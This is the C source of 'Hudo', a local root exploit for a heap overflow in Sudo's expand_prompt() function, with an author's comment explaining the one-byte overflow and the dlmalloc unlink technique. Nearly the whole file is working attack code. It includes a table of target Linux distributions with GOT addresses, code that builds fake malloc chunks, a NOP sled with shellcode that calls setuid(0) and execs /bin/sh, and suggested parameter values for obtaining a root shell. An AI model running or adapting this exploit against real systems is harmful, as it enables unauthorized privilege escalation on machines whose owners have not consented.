/*
 * Created: November 1, 2001
 * Updated: August 8, 2002
 * Updated-2: November 4, 2002 by Eds and Dexter_Man
 *   ______
 *  /   ___\ __ _  ____  ____  ____ ____ ____  __ _
 *  \____  \/  / \/    \/    \/  _ \    \ _  \/  / \
 * /        \___  \  \  \  \  \ ___/  \_/___  \___  \
 * \______  / ____/__/  /__/  /___ \__/ / ____/ ____/
 *        \/\/        \/    \/    \/    \/    \/
 *
 * Hudo versus Linux/Intel Sudo
 * "Another object superstitiously believed to embody magical powers"
 * Copyright (C) 2001 MaXX 
 *
 * Okay.. I discovered a vulnerability in Sudo while I was working on
 * the Vudo exploit. All Sudo versions are vulnerable, even the latest
 * one. In the file check.c, function expand_prompt(), the author forgot
 * to reset the lastchar variable in the second loop. So if the last
 * character of the prompt (controlled by the attacker) is a '%', and if
 * the first character of the prompt is a 'u' or a 'h', the attacker can
 * trick expand_prompt() into performing an additional escape.
 *
 * But there was not enough memory allocated for this additional escape,
 * so the attacker effectively overflowed the new_prompt buffer (but the
 * severity of the overflow depends on the length of the username or
 * hostname). Quite a weird vulnerability.
 *
 * After a lot of research, I managed to exploit the bug.. the attacker
 * does not even need to know the password of the user used to run the
 * exploit (unlike the Vudo exploit.. exploiting the bug via nobody or
 * www-data works fine now). I transformed the whole overflow into a
 * one-byte heap overflow, which in this case was hard to exploit, but
 * was actually exploitable, and I managed to exploit the bug 7 times
 * out of the.. 7 times I tried the exploit.
 *
 * I wrote the most important comments in the hudo.c file, but will
 * explain the main technique, and also the most reliable way to find
 * out the two command line values needed in order to obtain a root
 * shell. BTW.. if you manage to exploit Sudo on other Linux/Intel
 * architectures, please update hudo.c and let me know.. thank you.
 *
 * Imagine you have a hole somewhere in the heap.. you store the
 * new_prompt buffer (whose size corresponds to the third command line
 * parameter of the Hudo exploit), which will be overflowed, at the
 * beginning of this hole. Now imagine that after new_prompt was stored
 * at the beginning of the hole, the size of the last_remainder chunk
 * (the rest of the hole) is equal to (0x100+16) bytes. If we overwrite
 * the LSByte of this size field with a NUL byte during the one-byte
 * overflow, the size of the last_remainder chunk will become 0x100.
 *
 * Now imagine buffers are allocated within the apparent 0x100 bytes
 * of the last_remainder chunk, and imagine the hole is finally filled
 * with a last allocated buffer. dlmalloc will be tricked into believing
 * that the beginning of the next contiguous allocated chunk is located
 * immediately after the end of that last allocated buffer, whereas
 * it is in fact located 16 bytes after the end of the last allocated
 * buffer (dlmalloc is fooled because we transformed (0x100+16) into
 * 0x100).
 *
 * So if the last allocated buffer is free()d, dlmalloc will try to
 * unlink() the next contiguous chunk, and will read an imaginary
 * boundary tag located within the aforementioned 16 bytes, where of
 * course the Hudo exploit stored a fake boundary tag (via the malloc()
 * and free() of a huge buffer (whose size corresponds to the second
 * command line parameter of the Hudo exploit) filled with fake boundary
 * tags).
 *
 * That's all, folks :) Try $((16392-8)) for cmnd_args_size, and
 * $((16392-8-256-16)) for sudo_prompt_size, it will work most of the
 * time. If it does not work, a brute force or guess process is needed..
 *
 * -- MaXX
 */

#include <netdb.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/*
 * Code ripped from the malloc.c file shipped with the GNU C Library.
 */

typedef struct malloc_chunk {
    size_t prev_size;
    size_t size;
    struct malloc_chunk * fd;
    struct malloc_chunk * bk;
} * mchunkptr;

#define SIZE_SZ sizeof(size_t)
#define MALLOC_ALIGNMENT ( SIZE_SZ + SIZE_SZ )
#define MALLOC_ALIGN_MASK ( MALLOC_ALIGNMENT - 1 )
#define MINSIZE sizeof(struct malloc_chunk)

size_t
request2size( size_t request )
{
    size_t size;

    size = request + ( SIZE_SZ + MALLOC_ALIGN_MASK );
    if ( size < (MINSIZE + MALLOC_ALIGN_MASK) ) {
        size = MINSIZE;
    } else {
        size &= ~MALLOC_ALIGN_MASK;
    }
    return( size );
}

/*
 * Information concerning the architectures exploited by Hudo:
 *
 * - description: a string describing the target architecture;
 *
 * - fqdn: a boolean flag indicating whether or not fully-qualified
 * hostnames are required in the sudoers file (run `sudo -V' as root in
 * order to find out);
 *
 * - function_pointer: the address of the function pointer overwritten
 * by the exploit.. the malloc or free GOT entry should be okay (run
 * `objdump -R sudo | grep malloc' for example);
 *
 * - code_address: the 2^16 bytes heap area where the SHELL environment
 * variable is estrdup()ed by Sudo.. for example, if estrdup() returns
 * 0x08061242, code_address should be equal to 0x08060000;
 *
 * sudo: the complete path to the Sudo binary.. should be equal to
 * "/usr/bin/sudo" almost everywhere.
 */

typedef struct architecture_s {
    char * description;
    int fqdn;
    char * function_pointer;
    char * code_address;
    char * sudo;
} architecture_t;

#define FALSE 0
#define TRUE 1

architecture_t architectures[] = {
    {
        /* Thank you dethy :) */
        "Caldera OpenLinux Desktop 4.2 (Sudo version 1.6.3p5-1)",
        TRUE,
        (char *)0x0805bdcc,
        (char *)0x08060000,
        "/usr/bin/sudo"
    },
    {
        "Debian GNU/Linux 2.2 (Sudo version 1.6.2p2-2)",
        TRUE,
        (char *)0x0805c1b0,
        (char *)0x08060000,
        "/usr/bin/sudo"
    },
    {
        "Debian GNU/Linux 2.2 (Sudo version 1.6.2p2-2.1)",
        TRUE,
        (char *)0x0805c1b0,
        (char *)0x08060000,
        "/usr/bin/sudo"
    },
    {
        /* Thank you Sam ;) */
        "Debian GNU/Linux 2.3 (Sudo version 1.6.3p7-2)",
        TRUE,
        (char *)0x0805bd50,
        (char *)0x08060000,
        "/usr/bin/sudo"
    },
    {
        /* Thank you Sam */
        "Debian GNU/Linux 2.3 (Sudo version 1.6.3p7-5)",
        TRUE,
        (char *)0x0805be10,
        (char *)0x08050000,
        "/usr/bin/sudo"
    },
    {
        "Red Hat Linux release 6.2 (Sudo version sudo-1.6.1-1)",
        FALSE,
        (char *)0x0805bf78,
        (char *)0x08060000,
        "/usr/bin/sudo"
    },
    {
        "Red Hat Linux release 6.2 (Sudo version sudo-1.6.3p6-0.6x)",
        FALSE,
        (char *)0x0805bd6c,
        (char *)0x08060000,
        "/usr/bin/sudo"
    },
    {
        /* Thank you Scrippie :) */
        "Red Hat Linux release 7.0 (Sudo version 1.6.3-4)",
        FALSE,
        (char *)0x0805c7ac,
        (char *)0x08060000,
        "/usr/bin/sudo"
    },
    {
        /* Thank you Scrippie (bis :) */
        "Red Hat Linux release 7.0 (Sudo version 1.6.3p6-1)",
        FALSE,
        (char *)0x0805c5cc,
        (char *)0x08060000,
        "/usr/bin/sudo"
    },
    {
        /* Thank you dethy (bis ;) */
        "Red Hat Linux release 7.1 (Sudo version 1.6.3p6-1)",
        FALSE,
        (char *)0x0805c5cc,
        (char *)0x08060000,
        "/usr/bin/sudo"
    },
    {
        /* By Eds and Dexter_Man */
        "Red Hat Linux release 7.2",
        FALSE,
        (char *)0x0805c490,
        (char *)0x08060000,
        "/usr/bin/sudo"
    },
    {
        /* By Eds and Dexter_Man */
        "Red Hat Linux release 7.3",
        FALSE,
        (char *)0x0805c528,
        (char *)0x08060000,
        "/usr/bin/sudo"
    },

{ /* By dexter_man and EDS */
"Slackware 8.0 (sudo version 1.6.3p7)",
FALSE,
(char *) 0x805b940,
(char *)0x08060000,
"/usr/bin/sudo"
}
};


#define SUDO_ARGV 4
#define SUDO_ENVP 3

typedef struct hudo_s {
    architecture_t * p_architecture;
    size_t cmnd_args_size;
    size_t sudo_prompt_size;

    char * user_name;
    char * user_shost;

    char escape_specifier;
    size_t escaped_size;

    char * sudo_argv[ SUDO_ARGV ];
    char * sudo_envp[ SUDO_ENVP ];
} hudo_t;

int
user_name( hudo_t * p_hudo )
{
    struct passwd * pw;

    fputs( "[+] Looking for user_name: ", stderr );

    pw = getpwuid( getuid() );
    if ( pw == NULL ) {
        perror( "\n[-] getpwuid()" );
        return( -1 );
    }

    p_hudo->user_name = pw->pw_name;

    fprintf( stderr, "\"%s\"\n", p_hudo->user_name );
    return( 0 );
}

/*
 * The size of a malloc chunk is always equal to a multiple of 8 bytes..
 * the minimum number of bytes needed in order to pad a user's request
 * is therefore equal to 0, the maximum number of bytes is equal to 7.
 */
#define MIN_MALLOC_PADDING 0
#define MAX_MALLOC_PADDING MALLOC_ALIGN_MASK
/*
 * ESCAPE_SIZE is the length of the escape strings used by
 * expand_prompt() ("%u" or "%h").
 */
#define ESCAPE_SIZE 2
/*
 * Since expand_prompt() allocated memory in order to store a weird
 * escape string ("%u" or "%h"), but since the weird escape string was
 * in fact replaced with another string (the username or the hostname),
 * the username or hostname has to cover the size (ESCAPE_SIZE) of the
 * weird escape string, the malloc padding, and the least significant
 * byte of the size field associated with the next contiguous malloc
 * chunk, in order to perform a *one-byte* heap overflow.
 *
 * The minimum size of the username or hostname is therefore equal to 3
 * bytes, the maximum size is equal to 10 bytes (should work on almost
 * every computer.. at least it will work with nobody and www-data (no
 * password is needed in order to successfully exploit Sudo)).
 */
#define MIN_ESCAPED_SIZE ( (MIN_MALLOC_PADDING + 1) + ESCAPE_SIZE )
#define MAX_ESCAPED_SIZE ( (MAX_MALLOC_PADDING + 1) + ESCAPE_SIZE )

int
escaped_size( hudo_t * p_hudo )
{
    if ( p_hudo->escaped_size < MIN_ESCAPED_SIZE ) {
        return( -1 );
    }
    if ( p_hudo->escaped_size > MAX_ESCAPED_SIZE ) {
        return( -1 );
    }
    return( 0 );
}

/*
 * Computation of the user_shost variable, ripped from Sudo, file
 * sudo.c, function init_vars().
 */
int
user_shost( hudo_t * p_hudo )
{
    char thost[ MAXHOSTNAMELEN ];
    char * user_host;
    struct hostent * hp;
    char * p;

    if ( gethostname(thost, sizeof(thost)) ) {
        user_host = "localhost";
    } else {
        user_host = strdup( thost );
        if ( user_host == NULL ) {
            return( -1 );
        }
    }

    if ( p_hudo->p_architecture->fqdn ) {
        if ( (hp = gethostbyname(user_host)) ) {
            user_host = strdup( hp->h_name );
            if ( user_host == NULL ) {
                return( -1 );
            }
        }
    }

    if ( (p = strchr(user_host, '.')) ) {
        *p = '\0';
        p_hudo->user_shost = strdup( user_host );
        if ( p_hudo->user_shost == NULL ) {
            return( -1 );
        }
    } else {
        p_hudo->user_shost = user_host;
    }

    return( 0 );
}

int
escape_specifier_and_escaped_size( hudo_t * p_hudo )
{
    fputs( "[+] Determining escape_specifier and escaped_size: ", stderr 
);

    p_hudo->escape_specifier = 'u';
    p_hudo->escaped_size = strlen( p_hudo->user_name );
    if ( escaped_size(p_hudo) ) {
        p_hudo->escape_specifier = 'h';
        if ( user_shost(p_hudo) ) {
            fputs( "\n[-] user_shost()\n", stderr );
            return( -1 );
        }
        p_hudo->escaped_size = strlen( p_hudo->user_shost );
        if ( escaped_size(p_hudo) ) {
            fputs( "\n[-] escaped_size()\n", stderr );
            return( -1 );
        }
    }

    fprintf( stderr, "'%c' and %u bytes\n", p_hudo->escape_specifier,
        p_hudo->escaped_size );
    return( 0 );
}

#define SUDO_CMND "/chocolate/starfishstiqz/and/the/hot/dog/flavored/water"
#define DUMMY_CHARACTER 'B'
#define DUMMY_PREV_SIZE 0xdefaced
/*
 * A lot of NOPs (2^16 bytes) are stored in the heap (in order to bypass
 * Openwall) before the actual shellcode, in order to reliably exploit
 * the code_address value given in the architectures array, and in order
 * to provide a large memory area filled with even 4 bytes integers (see
 * below).
 */
#define NOPS_SIZE 0x10000
/*
 * A special, even (0x08eb9090 is an even integer.. an even integer is
 * needed in order to provide a memory area filled with 4 bytes integers
 * whose PREV_INUSE bits are clear), Intel NOP, capable of skipping the
 * 4 garbage bytes introduced at offset 8 by the unlink() exploitation
 * technique.
 */
#define NOP "\x90\x90\xeb\x08"
#define NOP_SIZE ( sizeof(NOP)-1 )
#define BK_OFFSET ( sizeof(size_t) + sizeof(size_t) + sizeof(mchunkptr) )

int
sudo_argv( hudo_t * p_hudo )
{
    unsigned int ui;
    size_t args_size;
    char * args;

    fputs( "[+] Building sudo_argv..\n", stderr );

    ui = 0;

    p_hudo->sudo_argv[ ui++ ] = p_hudo->p_architecture->sudo;

    p_hudo->sudo_argv[ ui++ ] = SUDO_CMND;

    args_size = p_hudo->cmnd_args_size - ( sizeof(SUDO_CMND) + SIZE_SZ );
    args = malloc( args_size );
    if ( args == NULL ) {
        perror( "[-] malloc()" );
        return( -1 );
    }
    p_hudo->sudo_argv[ ui++ ] = args;

    p_hudo->sudo_argv[ ui ] = NULL;

    memset( args, DUMMY_CHARACTER, (args_size - SIZE_SZ) % MINSIZE );
    args += ( args_size - SIZE_SZ ) % MINSIZE;

    for ( ui = 0; ui < (args_size - SIZE_SZ) / MINSIZE; ui++ ) {
        ( (mchunkptr)args )->prev_size = DUMMY_PREV_SIZE;
        ( (mchunkptr)args )->size = -NOPS_SIZE - NOP_SIZE;
        ( (mchunkptr)args )->fd = (mchunkptr)(
            p_hudo->p_architecture->function_pointer - BK_OFFSET
        );
        ( (mchunkptr)args )->bk = (mchunkptr)(
            p_hudo->p_architecture->code_address + NOPS_SIZE - NOP_SIZE
        );
        args += MINSIZE;
    }

    *args++ = DUMMY_CHARACTER;
    *args++ = DUMMY_CHARACTER;
    *args++ = DUMMY_CHARACTER;
    *args = '\0';

    return( 0 );
}

#define SHELL_KEY "SHELL"
#define SUDO_PROMPT_KEY "SUDO_PROMPT"
char shellcode[] =
    /* "\xeb\x08" fodder */
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    /* setuid( 0 ); */
    "\x31\xdb\x89\xd8\xb0\x17\xcd\x80"
    /* setgid( 0 ); */
    "\x31\xdb\x89\xd8\xb0\x2e\xcd\x80"
    /* execve( "/bin/sh", {"/bin/sh", NULL}, NULL ); */
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";
#define SHELLCODE_SIZE ( sizeof(shellcode)-1 )
#define ESCAPE_CHARACTER '%'
#define DUMMY_STRING "Please type Control-D.. "
#define DUMMY_STRING_SIZE ( sizeof(DUMMY_STRING)-1 )

int
sudo_envp( hudo_t * p_hudo )
{
    unsigned int ui;
    char * shell;
    size_t sudo_prompt_padding;
    char * sudo_prompt;
    size_t size;

    fputs( "[+] Building sudo_envp..\n", stderr );

    ui = 0;

    shell = malloc( sizeof(SHELL_KEY"=") + NOPS_SIZE + SHELLCODE_SIZE );
    if ( shell == NULL ) {
        perror( "[-] malloc()" );
        return( -1 );
    }
    p_hudo->sudo_envp[ ui++ ] = shell;

    /*
     * sudo_prompt_padding was obtained via the following equation:
     *
     * escaped_size + escaped_size + sudo_prompt_padding + 1 + 1 =
     * 1 + ( sudo_prompt_size - SIZE_SZ ) + 1
     */
    sudo_prompt_padding = ( p_hudo->sudo_prompt_size - SIZE_SZ ) -
        2 * p_hudo->escaped_size;
    sudo_prompt = malloc( sizeof(SUDO_PROMPT_KEY"=") + ESCAPE_SIZE +
        sudo_prompt_padding + ESCAPE_SIZE );
    if ( sudo_prompt == NULL ) {
        perror( "[-] malloc()" );
        return( -1 );
    }
    p_hudo->sudo_envp[ ui++ ] = sudo_prompt;

    p_hudo->sudo_envp[ ui ] = NULL;

    memcpy( shell, SHELL_KEY"=", sizeof(SHELL_KEY) );
    shell += sizeof(SHELL_KEY);
    for ( size = 0; size < NOPS_SIZE / NOP_SIZE; size++ ) {
        memcpy( shell, NOP, NOP_SIZE );
        shell += NOP_SIZE;
    }
    memcpy( shell, shellcode, SHELLCODE_SIZE );
    shell += SHELLCODE_SIZE;
    *shell = '\0';

    memcpy( sudo_prompt, SUDO_PROMPT_KEY"=", sizeof(SUDO_PROMPT_KEY) );
    sudo_prompt += sizeof(SUDO_PROMPT_KEY);
    *sudo_prompt++ = p_hudo->escape_specifier;
    *sudo_prompt++ = ESCAPE_CHARACTER;
    *sudo_prompt++ = p_hudo->escape_specifier;
    memcpy( sudo_prompt,
        
DUMMY_STRING+(DUMMY_STRING_SIZE-sudo_prompt_padding%DUMMY_STRING_SIZE),
        sudo_prompt_padding % DUMMY_STRING_SIZE );
    sudo_prompt += sudo_prompt_padding % DUMMY_STRING_SIZE;
    for ( ui = 0; ui < sudo_prompt_padding / DUMMY_STRING_SIZE; ui++ ) {
        memcpy( sudo_prompt, DUMMY_STRING, DUMMY_STRING_SIZE );
        sudo_prompt += DUMMY_STRING_SIZE;
    }
    *sudo_prompt++ = ESCAPE_CHARACTER;
    *sudo_prompt = '\0';

    return( 0 );
}

#define SURE_KILL_ARGV 3
#define SURE_KILL_OPTION "-K"

/*
 * In order to systematically trick Sudo into calling the verify_user()
 * function, `sudo -K' (removes the user's timestamp entirely) should
 * always be executed before the effective exploitation process is
 * carried out.. moreover it will provide some pleasant visual effect ;)
 */
int sure_kill( hudo_t * p_hudo )
{
    unsigned int sure_kill_argv_index = 0;
    char * sure_kill_argv[ SURE_KILL_ARGV ];
    pid_t fork_pid;
    pid_t wait_pid;

    fputs( "[+] Removing the user's timestamp entirely..\n", stderr );

    sure_kill_argv[ sure_kill_argv_index++ ] = 
p_hudo->p_architecture->sudo;
    sure_kill_argv[ sure_kill_argv_index++ ] = SURE_KILL_OPTION;
    sure_kill_argv[ sure_kill_argv_index ] = NULL;

    fork_pid = fork();
    if ( fork_pid < 0 ) {
        perror( "[-] fork()" );
        return( -1 );
    } else {
        if ( fork_pid == 0 ) {
            execve( sure_kill_argv[0], sure_kill_argv, NULL );
            perror( "[-] execve()" );
            return( -1 );
        } else {
            wait_pid = wait( NULL );
            if ( wait_pid != fork_pid ) {
                perror( "[-] wait()" );
                return( -1 );
            }
        }
    }

    return( 0 );
}

void
usage( char * hudo )
{
    unsigned char uc;

    fputs( "[+] Usage:\n", stderr );
    fprintf( stderr, "[-] %s architecture cmnd_args_size 
sudo_prompt_size\n",
        hudo );
    fputs( "\n", stderr );
    fputs( "[+] Architectures:\n", stderr );
    for ( uc = 0; uc < sizeof(architectures) / sizeof(architecture_t); 
uc++ ) {
        fprintf(stderr, "[-] 0x%02x: %s\n", uc, 
architectures[uc].description);
    }
}

int
main( int argc, char * argv[] )
{
    unsigned long ul;
    hudo_t hudo;

    fputs( "[+] Hudo versus Linux/Intel Sudo\n", stderr );
    fputs( "[+] \"Another object superstitiously believed to embody 
magical "
        "powers\"\n", stderr );
    fputs( "[+] Copyright (C) 2001 MaXX\n", stderr );
    fputs( "\n", stderr );

    if ( argc != 4 ) {
        usage( argv[0] == NULL ? "hudo" : argv[0] );
        return( -1 );
    }

    ul = strtoul( argv[1], NULL, 0 );
    if ( ul >= sizeof(architectures) / sizeof(architecture_t) ) {
        usage( argv[0] );
        return( -1 );
    }
    hudo.p_architecture = &( architectures[ul] );

    ul = strtoul( argv[2], NULL, 0 );
    if ( ul % MALLOC_ALIGNMENT || ul < MINSIZE ) {
        usage( argv[0] );
        return( -1 );
    }
    hudo.cmnd_args_size = ul;

    ul = strtoul( argv[3], NULL, 0 );
    if ( ul % MALLOC_ALIGNMENT || ul < MINSIZE ) {
        usage( argv[0] );
        return( -1 );
    }
    hudo.sudo_prompt_size = ul;

    if ( user_name(&hudo) ) {
        return( -1 );
    }
    if ( escape_specifier_and_escaped_size(&hudo) ) {
        return( -1 );
    }

    if ( sudo_argv(&hudo) ) {
        return( -1 );
    }
    if ( sudo_envp(&hudo) ) {
        return( -1 );
    }

    if ( sure_kill(&hudo) ) {
        return( -1 );
    }

    fputs( "[+] Executing sudo..\n", stderr );
    execve( hudo.sudo_argv[0], hudo.sudo_argv, hudo.sudo_envp );
    perror( "[-] execve()" );
    return( -1 );
}




